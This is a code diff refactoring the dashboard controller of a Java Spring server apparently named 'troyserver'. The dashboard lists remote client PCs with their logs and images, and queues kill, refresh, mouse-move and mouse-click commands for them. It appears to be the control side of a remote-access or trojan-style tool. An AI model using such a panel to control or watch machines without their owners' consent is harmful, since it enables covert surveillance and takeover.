@@ -2,11 +2,13 @@ package ch.lebois.troyserver.controller;
 
 import ch.lebois.troyserver.data.entity.Client;
 import ch.lebois.troyserver.data.entity.Message;
+import ch.lebois.troyserver.data.repository.ClientFieldRepository;
 import ch.lebois.troyserver.data.repository.ClientRepository;
 import ch.lebois.troyserver.data.repository.ImageRepository;
 import ch.lebois.troyserver.data.repository.MessageRepository;
-import ch.lebois.troyserver.model.DashboardModel;
+import ch.lebois.troyserver.service.ClientFieldService;
 import ch.lebois.troyserver.service.CookieService;
+import ch.lebois.troyserver.service.ModelService;
 import javax.servlet.http.HttpServletRequest;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
@@ -27,40 +29,41 @@ public class DashboardController {
     private ClientRepository clientRepository;
     private MessageRepository messageRepository;
     private ImageRepository imageRepository;
+    private ClientFieldRepository clientFieldRepository;
+
     private CookieService cookieService;
+    private ModelService modelService;
+    private ClientFieldService clientFieldService;
 
     public DashboardController(ClientRepository clientRepository, MessageRepository messageRepository,
-                               ImageRepository imageRepository, CookieService cookieService) {
+                               ImageRepository imageRepository, ClientFieldRepository clientFieldRepository,
+                               CookieService cookieService, ModelService modelService,
+                               ClientFieldService clientFieldService) {
         this.clientRepository = clientRepository;
         this.messageRepository = messageRepository;
         this.imageRepository = imageRepository;
+        this.clientFieldRepository = clientFieldRepository;
         this.cookieService = cookieService;
+        this.modelService = modelService;
+        this.clientFieldService = clientFieldService;
     }
 
     @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
     public String getClientControlPanel(@PathVariable(value = "client") String clientParam, Model model,
-                                        DashboardModel dashboardModel, HttpServletRequest request) {
+                                        HttpServletRequest request) {
         try {
             Client client = clientRepository.findOne(clientParam);
             if (client == null) {
                 return "redirect:/dashboard";
             }
-            dashboardModel.setClient(client);
-
-            setAtributes(clientParam, model, dashboardModel, request);
+            model.addAttribute("client", modelService.getClientModel(client));
+            model.addAttribute("logs", getLogs(clientParam));
+            model.addAttribute("images", imageRepository.findImagesByPcNameFkOrderByNameDesc(clientParam));
+            model.addAttribute("user", cookieService.getCurrentUser(request));
             return "dashboard";
         } catch (NullPointerException e) {
             return "redirect:/login";
         }
-    }
-
-    private void setAtributes(String clientName, Model model, DashboardModel dashboardModel,
-                              HttpServletRequest request) {
-        model.addAttribute("model", dashboardModel);
-        model.addAttribute("logs", getLogs(clientName));
-        model.addAttribute("images", imageRepository.findImagesByPcNameFkOrderByNameDesc(clientName));
-        String user = cookieService.getCurrentUser(request);
-        model.addAttribute("user", user);
     }
 
     private String getLogs(String clientName) {
@@ -93,17 +96,17 @@ public class DashboardController {
                                @RequestParam(name = "mousex") String mousex,
                                @RequestParam(name = "mousey") String mousey) {
         Client client = clientRepository.findOne(clientParam);
-        client.setPcNickname(nickname);
+        clientFieldService.setFieldValue(client, "nickname", nickname);
 
-        if (!refresh.equals(client.getRefreshtime())) {
-            client.setRefreshtime(refresh);
-            client.setCommands("refresh " + refresh);
+        if (!refresh.equals(clientFieldRepository.findClientFieldByClientAndField(client.getPcName(), "refreshtime").getValue())) {
+            clientFieldService.setFieldValue(client, "refreshtime", refresh);
+            clientFieldService.setFieldValue(client, "command", "refresh " + refresh);
         }
         if (kill.equals("kill")) {
-            client.setCommands("kill");
+            clientFieldService.setFieldValue(client, "command", "kill");
         }
         if (!mousex.equals("") && !mousey.equals("")) {
-            client.setCommands("mousemove " + mousex + " " + mousey);
+            clientFieldService.setFieldValue(client, "command", "mousemove " + mousex + " " + mousey);
         }
         clientRepository.save(client);
 
@@ -113,7 +116,7 @@ public class DashboardController {
     @RequestMapping(value = {"{client}/click"}, method = RequestMethod.POST)
     public String saveSettings(@PathVariable(value = "client") String clientParam) {
         Client client = clientRepository.findOne(clientParam);
-        client.setCommands("mouseclick");
+        clientFieldService.setFieldValue(client, "command", "mouseclick");
         clientRepository.save(client);
         return "redirect:/dashboard/" + clientParam;
     }
